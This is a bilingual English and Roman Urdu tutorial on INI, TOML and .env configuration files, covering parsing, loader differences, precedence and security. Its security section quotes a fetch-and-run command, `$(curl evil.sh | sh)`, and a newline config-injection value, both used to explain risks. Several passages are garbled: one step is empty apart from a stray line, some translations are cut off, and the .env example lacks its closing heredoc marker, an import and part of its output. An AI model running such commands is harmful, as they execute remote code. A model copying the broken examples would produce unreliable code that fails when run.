<BigIdea>
<Tr>
<En>
Programs read their **settings** from simple text files so you can change behaviour **without changing code**. Three small formats are everywhere. **INI**: `[section]` headers with `key = value` lines; old, simple, and **every value is a string** (`.gitconfig`, `php.ini`, `~/.aws/credentials`, systemd units). **TOML**: looks like INI but has a **real specification and real types** (`pyproject.toml`, `Cargo.toml`). **`.env`**: plain `NAME=value` lines loaded into **environment variables**, mainly for secrets and per-machine settings; never committed, and **each loader parses it slightly differently**. Real environment variables usually **win** over `.env`.
</En>
<Ur>
Programs apni **settings** saadi text files se parhte hain taa ke aap **code badle baghair** rawaiya badal saken. Teen chhote formats har jagah hain. **INI**: `[section]` headings aur `key = value` lines; purana, saada, aur **har value string** (`.gitconfig`, `php.ini`, `~/.aws/credentials`, systemd units). **TOML**: INI jaisa dikhta hai lekin **asli specification aur asli qisamen** rakhta hai (`pyproject.toml`, `Cargo.toml`). **`.env`**: saadi `NAME=value` lines jo **environment variables** me load hoti hain, zyada tar raazon aur har machine ki settings ke liye; kabhi commit nahi hoti, aur **har loader ise thora alag parhta** hai. Asli environment variables aam tor par `.env` par **bhaari** hote hain.
</Ur>
</Tr>

<Why>
<Tr>
<En>

- **The Twelve-Factor rule:** keep config out of code, so the same build runs in development, staging and production with different settings.
- **You'll edit these constantly:** `.gitconfig`, `~/.aws/credentials`, `php.ini`, `my.cnf`, `pyproject.toml`, `.env`, `.npmrc`, systemd `.service` files.
- **Small details cause real bugs:** a `%` in an INI password crashes Python apps, a space in a `.env` value breaks Bash scripts, a missing quote breaks a TOML file.
- **Security:** `.env` and credential files hold the keys to your systems. Where they live, who can read them, and whether they reach Git matters a lot.

</En>

- **Twelve-Factor qaida:** config ko code se bahar rakho, taa ke ek hi build development, staging aur production me alag settings ke saath chale.

- **Security:** `.env` aur credential files aap ke systems ki chabiyan rakhti hain. Ye kahan hain, kaun parh sakta hai, aur Git tak pahunchti hain ya nahi, bohot ahem hai.

## Picture it

<Tr>
<En>

Think of a **TV's settings menu** versus its **electronics**. The electronics (the code) are the same in every house; the settings (the config file) are what each family adjusts: language, volume limit, channel list. **INI** is a handwritten list of settings under headings ("Picture", "Sound"): easy, but everything is just words, and each TV brand reads it a bit differently. **TOML** is the same idea on a printed form that says exactly what kind of value each box takes (number, yes/no, date). A **`.env` file** is the **sticky note with the Wi-Fi password** next to the TV: specific to this house, private, and never photocopied into the instruction manual (Git).

</En>
<Ur>

**TV ka settings menu** aur us ki **electronics** socho. Electronics (code) har ghar me ek jaisi; settings (config file) wo hain jo har ghar wala badalta hai: zubaan, awaaz ki hadd, channels ki fehrist. **INI** headings ("Picture", "Sound") ke neeche haath se likhi settings ki fehrist hai: aasaan, lekin sab sirf alfaaz, aur har TV brand ise thora alag parhta hai. **TOML** wahi khayal chhape form par hai jo batata hai har khane me kis qisam ki value jati hai (number, haan/nahi, tareekh). **`.env` file** TV ke paas chipki **Wi-Fi password wali parchi** hai: isi ghar ki, zaati, aur kabhi hidayat ki kitab (Git) me photocopy nahi.

</Ur>

## Learn it step by step

<Walkthrough>

<Step title="INI: sections, keys and comments">

<Tr>
<En>

An INI file has **sections** in square brackets, and under each one `key = value` (or `key: value`) lines; lines starting with `;` or `#` are comments. It's the simplest grouped config, around since early Windows and Unix tools. Python reads it with the built-in `configparser`, PHP with `parse_ini_file`, Node with the `ini` package. There's **no official standard**: each program decides comment characters, case sensitivity, quotes and duplicates, so check the tool's docs.

</En>
<Ur>

INI file me square brackets me **sections** hote hain, aur har ek ke neeche `key = value` (ya `key: value`) lines; `;` ya `#` se shuru lines comments hain. Ye sab se saadi group wali config hai, shuruati Windows aur Unix tools ke zamane se. Python ise andar bane `configparser` se, PHP `parse_ini_file` se, Node `ini` package se parhta hai. **Koi sarkari standard nahi**: har program comment ke huroof, bare/chhote harf, quotes aur dohri keys khud tay karta hai, isliye tool ki docs dekhein.

</Ur>
</Tr>

```bash
cat > shop.ini <<'EOF'
; Shop API settings
[server]
host = 0.0.0.0
port = 8080
debug = no

[database]
Host = db.internal
port = 5432
name = shop
EOF
python3 - <<'PY'
import configparser
config = configparser.ConfigParser()
config.read("shop.ini")
print("sections:", config.sections())
for section in config.sections():
    for key, value in config[section].items():
        print(f"  [{section}] {key} = {value!r}")
PY
```

```text output
sections: ['server', 'database']
  [server] host = '0.0.0.0'
  [server] port = '8080'
  [server] debug = 'no'
  [database] host = 'db.internal'
  [database] port = '5432'
  [database] name = 'shop'
```

<Happened>
<Tr>
<En>`config.read` loaded the file, `sections()` listed sections in file order, and `!r` printed values with quotes so we can see their type. Two surprises: **every value is a string** (`'8080'`, `'no'`), and `Host` became `host`, because configparser lower-cases keys by default.</En>
<Ur>`config.read` ne file load ki, `sections()` ne file ki tarteeb me sections dikhaye, aur `!r` ne values quotes ke saath chhaapin taa ke qisam dikhe. Do hairaniyan: **har value string hai** (`'8080'`, `'no'`), aur `Host` `host` ban gaya, kyun ke configparser default me keys chhote huroof me karta hai.</Ur>
</Tr>
</Happened>

</Step>

<Step title="INI values are strings: convert types">

<Tr>
<En>

INI has no types; your program decides. `'8080' + 1` is an error, and `'no'` is a non-empty string, which counts as **true** in an `if`. configparser has helpers: `getint`, `getfloat` and `getboolean` (accepts `1/yes/true/on` and `0/no/false/off` in any case). Give defaults with `fallback=` so a missing key doesn't crash the program.

</En>
<Ur>

INI me qisamen nahi; aap ka program tay karta hai. `'8080' + 1` error hai, aur `'no'` khaali na hone wali string hai, jo `if` me **true** ginti hai. configparser ke madadgar hain: `getint`, `getfloat` aur `getboolean` (kisi bhi harf me `1/yes/true/on` aur `0/no/false/off` maanta hai). `fallback=` se defaults dein taa ke ghayab key program na giraye.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import configparser
config = configparser.ConfigParser()
config.read("shop.ini")
server = config["server"]
print("raw debug:", repr(server["debug"]), "-> if-test says", bool(server["debug"]))
print("getboolean:", server.getboolean("debug"))
print("getint + 1:", server.getint("port") + 1)
print("missing key with fallback:", server.getint("workers", fallback=4))
PY
```

```text output
raw debug: 'no' -> if-test says True
getboolean: False
getint + 1: 8081
missing key with fallback: 4
```

<Happened>
<Tr>
<En>`bool('no')` is **True**, so debug mode would be **on** in production: a classic bug. `getboolean` understood `no` and returned `False`, `getint` turned `'8080'` into 8080 so `+ 1` worked, and the missing `workers` key returned the fallback 4.</En>
<Ur>`bool('no')` **True** hai, isliye production me debug mode **on** hota: purana mashhoor bug. `getboolean` ne `no` samjha aur `False` diya, `getint` ne `'8080'` ko 8080 banaya to `+ 1` chala, aur ghayab `workers` key ne fallback 4 diya.</Ur>
</Tr>
</Happened>

</Step>

<Step title="INI defaults, interpolation and the % trap">

<Tr>
<En>

configparser's special `[DEFAULT]` section gives values to **every** section, and **interpolation** lets a value include another with `%(name)s`, handy for paths built from a base folder. Because `%` is special, a literal `%` must be written `%%`; a password like `abc%123` makes Python raise an error. Use `RawConfigParser` (no interpolation) for files with secrets or user data.

</En>
<Ur>

configparser ka khaas `[DEFAULT]` section **har** section ko values deta hai, aur **interpolation** `%(name)s` se ek value ko doosri shamil karne deta hai, base folder se paths banane ke liye kaam ka. Kyun ke `%` khaas hai, lafzi `%` ko `%%` likhna padta hai; `abc%123` jaisa password Python se error uthwata hai. Raaz ya user data wali files ke liye `RawConfigParser` (interpolation nahi) istemal karein.

</Ur>
</Tr>

```bash
cat > paths.ini <<'EOF'
[DEFAULT]
base_dir = /srv/shop

[logging]
file = %(base_dir)s/logs/app.log

[uploads]
dir = %(base_dir)s/uploads

[secrets]
db_password = abc%123
EOF
python3 - <<'PY'
import configparser
config = configparser.ConfigParser()
config.read("paths.ini")
print("log file:   ", config["logging"]["file"])
print("uploads dir:", config["uploads"]["dir"])
try:
    print(config["secrets"]["db_password"])
except configparser.InterpolationSyntaxError as err:
    print("ERROR:      ", str(err).splitlines()[0])
raw = configparser.RawConfigParser()
raw.read("paths.ini")
print("raw parser: ", raw["secrets"]["db_password"])
PY
```

```text output
log file:    /srv/shop/logs/app.log
uploads dir: /srv/shop/uploads
ERROR:       '%' must be followed by '%' or '(', found: '%123'
raw parser:  abc%123
```

<Happened>
<Tr>
<En>`base_dir` from `[DEFAULT]` was visible everywhere, and `%(base_dir)s` was replaced by its value (the trailing `s` means "as a string"). The password's lone `%` raised `InterpolationSyntaxError`: in a real app, a crash at startup with a confusing error. `RawConfigParser` returned it exactly as written.</En>
<Ur>`[DEFAULT]` ka `base_dir` har jagah nazar aaya, aur `%(base_dir)s` us ki value se badal gaya (aakhir ka `s` matlab "string ki tarah"). Password ke akele `%` ne `InterpolationSyntaxError` uthaya: asli app me startup par uljhan wale error ke saath crash. `RawConfigParser` ne use bilkul waisa diya jaisa likha tha.</Ur>
</Tr>
</Happened>

</Step>

<Step title="INI in tools you already use">

<Tr>
<En>

</En>

```ini
[client-prod]
```

<Step title="TOML: INI with real types">

<Tr>
<En>

TOML ("Tom's Obvious, Minimal Language") keeps INI's look but has a **precise specification** (v1.0.0) and **typed values**: quoted strings, integers, floats, booleans, dates and times, arrays and tables. No guessing (unlike YAML) and no "everything is a string" (unlike INI), so every parser reads a file the same way. Python 3.11+ has `tomllib` built in. Comments start with `#`; **strings must be quoted** (an unquoted word is an error); keys are case-sensitive.

</En>
<Ur>

TOML ("Tom's Obvious, Minimal Language") INI ki shakal rakhta hai lekin **theek theek specification** (v1.0.0) aur **qisam wali values** rakhta hai: quoted strings, integers, floats, booleans, tareekhen aur waqt, arrays aur tables. Koi andaza nahi (YAML ke bar-aks) aur "sab string" nahi (INI ke bar-aks), isliye har parser file ek hi tarah parhta hai. Python 3.11+ me `tomllib` andar se hai. Comments `#` se; **strings quote karna lazmi** (baghair quotes lafz error hai); keys me bare/chhote harf ka farq hai.

</Ur>
</Tr>

```bash
cat > app.toml <<'EOF'
# Shop API configuration
name = "shop-api"
version = "1.10"            # quoted, so it stays a string
port = 8080
timeout_seconds = 2.5
debug = false
country = "NO"              # no Norway problem: strings are always quoted
allowed_hosts = ["shop.example.com", "api.example.com"]
maintenance_window = 2026-11-15T02:00:00Z
EOF
python3 - <<'PY'
import tomllib
with open("app.toml", "rb") as f:
    config = tomllib.load(f)
for key, value in config.items():
    print(f"{key:19} {type(value).__name__:9} {value!r}")
PY
```

```text output
name                str       'shop-api'
version             str       '1.10'
port                int       8080
timeout_seconds     float     2.5
debug               bool      False
country             str       'NO'
allowed_hosts       list      ['shop.example.com', 'api.example.com']
maintenance_window  datetime  datetime.datetime(2026, 11, 15, 2, 0, tzinfo=datetime.timezone.utc)
```

<Happened>
<Tr>
<En>`tomllib.load` needs the file opened in **binary** mode (`"rb"`), because TOML is always UTF-8. Every value arrived with the **type the file says**: `int`, `float`, `bool`, `str`, `list`. `version = "1.10"` and `country = "NO"` stayed exactly as written, and `2026-11-15T02:00:00Z` became a real **datetime** in UTC (`Z`), a native TOML type.</En>
<Ur>`tomllib.load` ko file **binary** mode (`"rb"`) me khuli chahiye, kyun ke TOML hamesha UTF-8 hai. Har value **file ki batayi qisam** ke saath aayi: `int`, `float`, `bool`, `str`, `list`. `version = "1.10"` aur `country = "NO"` bilkul waisi rahin, aur `2026-11-15T02:00:00Z` UTC (`Z`) me asli **datetime** bana, TOML ki apni qisam.</Ur>
</Tr>
</Happened>

</Step>

<Step title="TOML tables and nesting">

<Tr>
<En>

A **table** (`[name]`) is a group of keys, like an INI section; `[a.b]` nests a table inside `a`. **Dotted keys** (`a.b = 1`) and **inline tables** (`{ x = 1, y = 2 }`) are shorter ways to write the same nesting, so pick whichever reads best. Real config is hierarchical (`database.primary.host`, `tool.ruff.lint`). A table can be declared only **once**; defining the same key twice is an error, not "last one wins".

</En>
<Ur>

**Table** (`[name]`) keys ka group hai, INI section jaisa; `[a.b]` table ko `a` ke andar rakhta hai. **Dotted keys** (`a.b = 1`) aur **inline tables** (`{ x = 1, y = 2 }`) wahi nesting likhne ke chhote tareeqe hain, jo parhne me achha lage chunein. </Ur>

<Step title=".env files: syntax and loading">

<Tr>
<En>

A `.env` file has `NAME=value` lines (plus `#` comments). A **loader** puts them into the program's **environment variables** at startup, so code reads `process.env.PORT` / `os.environ["PORT"]` the same everywhere: `.env` provides them on your laptop, the platform in production. Loaders: Python `python-dotenv`, Node 20.6+ `node --env-file=.env` (built in), Docker Compose (`${VAR}` substitution and `env_file:`), Laravel, Next.js and Vite. All values are **strings**; keep `.env` out of Git and commit `.env.example`.

</En>
<Ur>

`.env` file me `NAME=value` lines (aur `#` comments) hoti hain. **Loader** inhe startup par program ke **environment variables** me daalta hai, taa ke code har jagah `process.env.PORT` / `os.environ["PORT"]` ek hi tarah parhe: laptop par `.env` deti hai, production me platform. Loaders: Python `python-dotenv`, Node 20.6+ `node --env-file=.env` (andar se), Docker Compose (`${VAR}` badalna aur `env_file:`), Laravel, Next.js aur Vite. Saari values **strings** hain; `.env` Git se bahar rakhein aur `.env.example` commit karein.

</Ur>
</Tr>

```bash
cat > .env <<'EOF'
# local development settings
PORT=3000
APP_NAME="Shop API"
DATABASE_URL=postgres://shop:devpass@localhost:5432/shop
FEATURE_CHECKOUT_V2=true

python3 -c '

import os
load_dotenv()
print("python:", os.environ["APP_NAME"], "on port", os.environ["PORT"], "| type:", type(os.environ["PORT"]).__name__)'
node --env-file=.env -e 'console.log("node:  ", process.env.APP_NAME, "on port", process.env.PORT, "| type:", typeof process.env.PORT)'
```

```text output

node:   Shop API on port 3000 | type: string
```

<Happened>
<Tr>
<En>`APP_NAME` is quoted because it has a space; the loader removes the quotes. `load_dotenv()` copied the values into `os.environ`, and Node's `--env-file` did the same before the code ran. Both see `PORT` as a **string**, so convert it yourself (`int(...)`, `Number(...)`); `FEATURE_CHECKOUT_V2` is the string `"true"`, not a boolean.</En>
<Ur>`APP_NAME` quote hai kyun ke us me space hai; loader quotes hata deta hai. `load_dotenv()` ne values `os.environ` me copy kin, aur Node ke `--env-file` ne code chalne se pehle yahi kiya. Dono `PORT` ko **string** dekhte hain, isliye khud badlein (`int(...)`, `Number(...)`); `FEATURE_CHECKOUT_V2` string `"true"` hai, boolean nahi.</Ur>

<Step title="Loaders disagree: the .env portability trap">

<Tr>
<En>

There's **no official `.env` standard**: python-dotenv, Node, Docker Compose and Bash `source` treat quotes, spaces, `$VARIABLES`, `export` and comments differently. A `.env` that works for your Node app may break a Bash deploy script. Safest subset: `NAME=value` with **no spaces around `=`**, **quote values with spaces or `#`**, no multi-line values, and avoid `$` unless you know every loader (in Compose, `$$` means a literal `$`). Below, one file gives three different results.

</En>
<Ur>

**`.env` ka koi sarkari standard nahi**: python-dotenv, Node, Docker Compose aur Bash `source` quotes, spaces, `$VARIABLES`, `export` aur comments ko alag samajhte hain. Jo `.env` aap ki Node app ke liye chale, wo Bash deploy script tor sakti hai. Sab se mehfooz hissa: `=` ke ird gird **spaces nahi**, **spaces ya `#` wali values quote**, kai lines wali values nahi, aur `$` se bachein jab tak har loader ka rawaiya na pata ho (Compose me `$$` lafzi `$` hai). Neeche ek file teen alag nateeje deti hai.

</Ur>
</Tr>

```bash
export USER=alex
cat > tricky.env <<'EOF'
FULL_NAME=Sam Lee
SPACED = value
GREETING="Hi ${USER}"
EOF
echo "--- python-dotenv:"
python3 -c 'from dotenv import dotenv_values; [print(f"  {k}={v!r}") for k, v in dotenv_values("tricky.env").items()]'
echo "--- node --env-file:"
node --env-file=tricky.env -e 'for (const k of ["FULL_NAME", "SPACED", "GREETING"]) console.log(`  ${k}=${JSON.stringify(process.env[k])}`)'
echo "--- bash 'source':"
bash -c 'set -a; source ./tricky.env 2>errors.txt; set +a
  sed "s#^.*tricky.env: #  error: #" errors.txt
  for k in FULL_NAME SPACED GREETING; do echo "  $k=${!k-(not set)}"; done'
```

```text output
--- python-dotenv:
  FULL_NAME='Sam Lee'
  SPACED='value'
  GREETING='Hi alex'
--- node --env-file:
  FULL_NAME="Sam Lee"
  SPACED="value"
  GREETING="Hi ${USER}"
--- bash 'source':
  error: line 1: Lee: command not found
  error: line 2: SPACED: command not found
  FULL_NAME=(not set)
  SPACED=(not set)
  GREETING=Hi alex
```

<Happened>
<Tr>
<En>

- **python-dotenv** accepted the unquoted space, trimmed spaces around `=`, and **expanded** `${USER}`.
- **Node** accepted the first two lines but did **not** expand `${USER}`.
- **Bash** read the file as shell code: `FULL_NAME=Sam Lee` means "run the command `Lee`" and `SPACED = value` means "run `SPACED`", both errors. Only `GREETING` worked.
- `set -a` auto-exports variables while sourcing; `${!k-(not set)}` reads the variable whose **name** is in `k`.

**Lesson:** write `.env` files in the safe subset (`FULL_NAME="Sam Lee"`, `SPACED=value`) and test them with every tool that reads them.

</En>
<Ur>

- **python-dotenv** ne baghair quotes space maana, `=` ke ird gird spaces kaate, aur `${USER}` **phailaya**.
- **Node** ne pehli do lines maanin lekin `${USER}` **nahi** phailaya.
- **Bash** ne file ko shell code samjha: `FULL_NAME=Sam Lee` ka matlab "`Lee` command chalao" aur `SPACED = value` ka "`SPACED` chalao", dono errors. Sirf `GREETING` chala.
- `set -a` source karte waqt variables khud export karta hai; `${!k-(not set)}` wo variable parhta hai jis ka **naam** `k` me hai.

**Sabaq:** `.env` files mehfooz hisse me likhein (`FULL_NAME="Sam Lee"`, `SPACED=value`) aur har parhne wale tool se test karein.

</Ur>
</Tr>
</Happened>

</Step>

<Step title="Precedence: which value wins?">

<Tr>
<En>

When a setting exists in several places, a fixed **precedence order** decides which is used, so production can override development defaults without editing files. Common order, highest first: **command-line flag → real environment variable → `.env` → config file → default in code**. python-dotenv and Node's `--env-file` do **not** override variables that already exist (unless you ask with `override=True`). Confusion here causes many "I changed the setting and nothing happened!" moments, so print the **effective** config at startup (without secrets).

</En>
<Ur>

Jab setting kai jagah ho, ek tay **precedence tarteeb** faisla karti hai kaunsi istemal ho, taa ke production files badle baghair development defaults badal sake. Aam tarteeb, sab se upar pehle: **command-line flag → asli environment variable → `.env` → config file → code ka default**. python-dotenv aur Node ka `--env-file` pehle se maujood variables ko **nahi** badalte (jab tak `override=True` na kahein). Is uljhan se bohot se "setting badli aur kuch nahi hua!" lamhe aate hain, isliye startup par **asal me laagu** config (raazon ke baghair) chhaapein.

</Ur>
</Tr>

```bash
printf 'PORT=3000\nMODE=development\n' > .env
echo "--- no real env var, so .env is used:"
python3 -c 'from dotenv import load_dotenv; import os; load_dotenv(); print("  PORT =", os.environ["PORT"], "| MODE =", os.environ["MODE"])'
echo "--- real env var PORT=8080 wins over .env:"
PORT=8080 python3 -c 'from dotenv import load_dotenv; import os; load_dotenv(); print("  PORT =", os.environ["PORT"], "| MODE =", os.environ["MODE"])'
PORT=8080 node --env-file=.env -e 'console.log("  node: PORT =", process.env.PORT)'
echo "--- override=True makes .env win (rarely what you want):"
PORT=8080 python3 -c 'from dotenv import load_dotenv; import os; load_dotenv(override=True); print("  PORT =", os.environ["PORT"])'
```

```text output
--- no real env var, so .env is used:
  PORT = 3000 | MODE = development
--- real env var PORT=8080 wins over .env:
  PORT = 8080 | MODE = development
  node: PORT = 8080
--- override=True makes .env win (rarely what you want):
  PORT = 3000
```

```text
highest  ┌─────────────────────────────┐
         │ command-line flag  --port   │
         │ real environment variable   │  ← set by Docker, Kubernetes, CI, systemd
         │ .env file                   │  ← local development
         │ config file (TOML/INI/YAML) │
lowest   │ default in the code         │
         └─────────────────────────────┘
```

<Happened>
<Tr>
<En>`PORT=8080 python3 ...` set a real variable for one command; `load_dotenv()` saw it already existed and **kept** it, while `MODE` still came from `.env`. Node behaved the same. `override=True` let `.env` replace the real value, occasionally useful but it breaks the rule that the platform's environment wins.</En>
<Ur>`PORT=8080 python3 ...` ne ek command ke liye asli variable set kiya; `load_dotenv()` ne dekha ke ye pehle se hai aur use **rakha**, jab ke `MODE` ab bhi `.env` se aaya. Node ne bhi yahi kiya. `override=True` ne `.env` ko asli value badalne di, kabhi kabhi kaam ki, lekin ye qaida torti hai ke platform ka environment jeet-ta hai.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Choosing a format">

<Tr>
<En>

| | INI | TOML | `.env` | YAML | JSON |
| --- | --- | --- | --- | --- | --- |
| Official spec | No | Yes (v1.0.0) | No | Yes | Yes |
| Types | Strings only | Real types | Strings only | Guessed | Real types |
| Nesting | Sections only | Yes | No (flat) | Yes | Yes |
| Comments | Yes | Yes | Yes | Yes | No |
| Typical use | Legacy tool config | App/tool config | Secrets, per-machine env | DevOps manifests, CI | APIs, machine-written config |
| Main trap | Program-specific rules, `%` | Must quote strings | Loaders differ, never commit | Indentation, type guessing | No comments, strict commas |

</En>
<Ur>

| | INI | TOML | `.env` | YAML | JSON |
| --- | --- | --- | --- | --- | --- |
| Sarkari spec | Nahi | Haan (v1.0.0) | Nahi | Haan | Haan |
| Qisamen | Sirf strings | Asli qisamen | Sirf strings | Andaza | Asli qisamen |
| Nesting | Sirf sections | Haan | Nahi (seedha) | Haan | Haan |
| Comments | Haan | Haan | Haan | Haan | Nahi |
| Aam istemal | Purane tools ki config | App/tool config | Raaz, har machine ka env | DevOps manifests, CI | APIs, machine ki likhi config |
| Bara jaal | Har program ke qawaid, `%` | Strings quote lazmi | Loaders mukhtalif, commit nahi | Indentation, qisam ka andaza | Comments nahi, sakht commas |

</Ur>

## Common mistakes

<Compare>
<Bad title="Treat INI strings as booleans, unquoted .env values">

```text
if config["server"]["debug"]:      # "no" and "false" are truthy strings!
    enable_debug()

# .env
COMPANY_NAME=Acme Traders          # breaks Bash `source`
```

</Bad>
<Good title="Convert explicitly, quote values with spaces">

```text
if config["server"].getboolean("debug", fallback=False):
    enable_debug()

# .env
COMPANY_NAME="Acme Traders"
```

</Good>
</Compare>

<Tr>
<En>

More mistakes to avoid:

- **`%` in INI values** with Python's `ConfigParser` (use `%%` or `RawConfigParser`).
- **Unquoted strings in TOML** (`name = shop` is an error), or quoting numbers by accident (`port = "8080"` is a string).
- **Declaring the same TOML table twice.**
- **Expecting `.env` values to be numbers or booleans:** they're always strings.
- **Committing `.env`**, or putting real secrets in `.env.example`.
- **Assuming `.env` overrides real environment variables:** usually it doesn't, so a stale exported variable silently wins.

</En>
<Ur>

Bachne wali mazeed ghaltiyan:

- Python ke `ConfigParser` ke saath **INI values me `%`** (`%%` ya `RawConfigParser` istemal karein).
- **TOML me baghair quotes strings** (`name = shop` error hai), ya ghalti se numbers quote karna (`port = "8080"` string hai).
- **Ek hi TOML table do dafa declare karna.**
- **`.env` values se numbers ya booleans ki umeed:** ye hamesha strings hain.
- **`.env` commit karna**, ya `.env.example` me asli raaz daalna.
- **Samajhna ke `.env` asli environment variables ko badalti hai:** aam tor par nahi, isliye purana export shuda variable chupke se jeet-ta hai.

</Ur>
</Tr>

<Challenge title="A layered config loader">

<Tr>
<En>
Build a small config loader in Python: defaults in code, settings in TOML, secrets from `.env`, environment variables overriding everything, and the effective config printed with the secret masked.
</En>
<Ur>
Python me chhota config loader banayen: code me defaults, TOML me settings, `.env` se raaz, environment variables sab par bhaari, aur asal laagu config raaz chhupa kar chhaapein.
</Ur>
</Tr>

```bash
cat > settings.toml <<'EOF'
[server]
host = "0.0.0.0"
port = 8080
workers = 4

[database]
host = "db.internal"
name = "shop"
EOF
cat > .env <<'EOF'
DB_PASSWORD="s3cr3t#pass"
SERVER_WORKERS=2
EOF
cat > config.py <<'EOF'
import os, tomllib
from dotenv import load_dotenv

DEFAULTS = {"server": {"host": "127.0.0.1", "port": 8000, "workers": 1, "debug": False}}

def load_config():
    load_dotenv()                                    # .env -> os.environ (real env vars win)
    config = {s: dict(v) for s, v in DEFAULTS.items()}
    with open("settings.toml", "rb") as f:           # TOML file overrides defaults
        for section, values in tomllib.load(f).items():
            config.setdefault(section, {}).update(values)
    for section, values in config.items():           # SECTION_KEY env vars override TOML
        for key, value in values.items():
            env_value = os.environ.get(f"{section}_{key}".upper())
            if env_value is not None:
                values[key] = type(value)(env_value) if not isinstance(value, bool) else env_value.lower() == "true"
    config["database"]["password"] = os.environ["DB_PASSWORD"]   # secrets only from the environment
    return config

def masked(config):
    return {s: {k: ("****" if "password" in k else v) for k, v in vals.items()} for s, vals in config.items()}

if __name__ == "__main__":
    cfg = load_config()
    for section, values in masked(cfg).items():
        print(f"[{section}]", ", ".join(f"{k}={v!r}" for k, v in values.items()))
    print("password length:", len(cfg["database"]["password"]))
EOF
echo "--- normal run:"; python3 config.py
echo "--- production override via real env vars:"; SERVER_PORT=80 SERVER_DEBUG=true python3 config.py | head -1
```

<DeepDive title="Real world: an invoicing API on systemd">

A developer deploys an invoicing backend (Node.js/Express) to a Linux server with systemd. In development she uses `.env` with `node --env-file=.env`. On the server:

- Secrets go in `/etc/invoice-api/api.env` (owned by root, permissions `600`) and are loaded by the unit file's `EnvironmentFile=`: the systemd INI format pointing to a `.env`-style file.
- Non-secret settings (rate limits, log level, feature flags) live in a committed `config.toml`, so changes are reviewed in pull requests.
- At startup the app logs its effective config with secrets masked, so when a colleague asks "why is the rate limit 50 instead of 100?", the log shows the value came from an environment variable left over in the systemd file.

Once, a Bash backup script on the same server `source`d the `.env` and failed with "command not found": `COMPANY_NAME=Acme Traders` had a space and no quotes. Quoting it fixed both the script and the app.

</DeepDive>

<DeepDive title="Security lens">

Config files often hold the most valuable data on a server. Protect where they live, who can read them, and what goes into them.

- **Permissions:** secret config files should be readable only by the service user (`chmod 600`). `~/.aws/credentials` and `.env` files are prime targets for malware.
- **Never commit** `.env`, `credentials`, or config with real secrets. Use `.gitignore` plus secret scanning.
- **Don't serve config files over the web:** bots constantly scan for exposed `/.env` or `/config.ini`. Keep them **outside** the web root and block dotfiles in Nginx/Apache.
- **Config injection:** if user input is written into a config file unvalidated, a value containing a newline can add settings (input `x` + newline + `ADMIN=true` creates an extra `ADMIN=true` line). Validate input and write config with a proper library.
- **`source` executes code:** loading a `.env` with Bash `source` runs it as shell, so a value like `$(curl evil.sh | sh)` would run. Only source files you control, or use a real loader.
- **Print effective config without secrets**, and keep secrets out of logs, error pages and crash reports.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="What is the main difference between INI and TOML?">
INI is an informal format with sections and key-value pairs but no official specification and no types, so every value is a string and parsers differ in details. TOML has a formal specification with typed values such as strings, integers, floats, booleans, dates, arrays and nested tables, so all compliant parsers read a file the same way.
</QA>

<QA q="What is a .env file and how should it be used?">
A .env file contains NAME=value lines that a loader such as python-dotenv, Node's --env-file option or Docker Compose loads into environment variables. It is used for secrets and per-machine settings in local development. It should never be committed to Git; instead a .env.example template with variable names but no real values is committed, and production platforms provide real environment variables.
</QA>

<QA q="If PORT is set both in .env and as a real environment variable, which one does the app use?">
With common loaders such as python-dotenv and Node's --env-file, the existing real environment variable wins and the .env value is ignored, unless an override option is used. This lets deployment platforms override development defaults, but it can also cause confusion when a stale exported variable silently takes precedence.
</QA>

<QA q="What is an array of tables in TOML?">
An array of tables is declared with double square brackets, such as [[servers]]. Each occurrence adds a new table to an array with that name, and the keys that follow belong to that element until the next header. It corresponds to a JSON array of objects and is used for lists like redirects, binaries or servers.
</QA>

<QA q="Why is it risky to load a .env file with Bash source?">
source executes the file as shell code, so values with spaces can be interpreted as commands and malicious content such as command substitutions would run with the script's privileges. It also parses quoting differently from application loaders. Safer options are a dedicated parser, or sourcing only files you fully control with strictly quoted values.
</QA>

</DeepDive>
